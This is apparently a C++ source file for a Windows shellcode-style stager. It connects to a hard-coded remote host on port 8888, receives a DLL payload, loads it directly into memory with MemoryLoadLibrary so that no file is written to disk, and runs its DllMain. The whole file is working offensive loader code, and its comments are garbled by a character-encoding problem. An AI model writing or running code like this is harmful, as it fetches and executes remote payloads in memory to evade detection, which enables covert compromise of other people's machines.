#include <WinSock2.h>
#include <Windows.h>
#include <stdio.h>
#include "MemoryModule.h"
#pragma comment(lib,"ws2_32.lib")

#define PAYLOAD_SIZE 1024*512
typedef BOOL(*Module)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);

typedef VOID(*msg)(VOID);
PBYTE bFileBuffer = NULL;


BOOL GetPEDLL() {

	DWORD dwError;
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA wsaData;
	SOCKET socks;
	SHORT sListenPort = 8888;	// �����˿�
	struct sockaddr_in sin;

	if (WSAStartup(sockVersion, &wsaData) != 0)
	{
		dwError = GetLastError();
		printf("[*]WSAStarup Error : %d \n", dwError);
		return FALSE;
	}

	socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);	// ����socks

	if (socks == INVALID_SOCKET)
	{
		dwError = GetLastError();
		printf("[*]Socket Error : %d \n", dwError);
		return FALSE;
	}

	sin.sin_family = AF_INET;
	sin.sin_port = htons(sListenPort);
	sin.sin_addr.S_un.S_addr = inet_addr("192.168.10.129");	// ������ַ

	if (connect(socks, (struct sockaddr*)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		dwError = GetLastError();
		printf("[*]Bind Error : %d \n", dwError);
		return FALSE;
	}

	int ret = 0;
	ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
	ret = recv(socks, (PCHAR)bFileBuffer, 2650, NULL);
	ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
	ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);
	ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);

	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);


	ret = recv(socks, (PCHAR)bFileBuffer, 5120, NULL);

	if (ret > 0)
	{
		closesocket(socks);
	}


	return TRUE;
}

// ���ļ�����ȡ��С
DWORD OpenBadCodeDLL(HANDLE& hBadCodeDll, LPCWSTR lpwszBadCodeFileName) {
	DWORD dwHighFileSize = 0;
	DWORD dwLowFileSize = 0;
	// ���ļ�
	hBadCodeDll = CreateFile(lpwszBadCodeFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hBadCodeDll == INVALID_HANDLE_VALUE) {
		return GetLastError();
	}
	dwLowFileSize = GetFileSize(hBadCodeDll, &dwHighFileSize);
	return dwLowFileSize;
}


int main()
{

	HMEMORYMODULE hModule;
	Module DllMain;
	bFileBuffer = new BYTE[PAYLOAD_SIZE];
	GetPEDLL();
	// ����PE�ļ�
	hModule = MemoryLoadLibrary(bFileBuffer);
	// �������ʧ�ܣ����˳�
	if (hModule == NULL) {
		delete[] bFileBuffer;
		return -1;
	}
	// ��ȡmsg����������ַ
	DllMain = (Module)MemoryGetProcAddress(hModule, "DllMain");
	// ����msg����
	DllMain(0, 0, 0);
	// �ͷ���Դ
	DWORD dwThread;
	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)DllMain, NULL, NULL, &dwThread);

	WaitForSingleObject(hThread, INFINITE);

	MemoryFreeLibrary(hModule);
	// �ͷ�PE�ڴ�
	delete[] bFileBuffer;
	return GetLastError();
}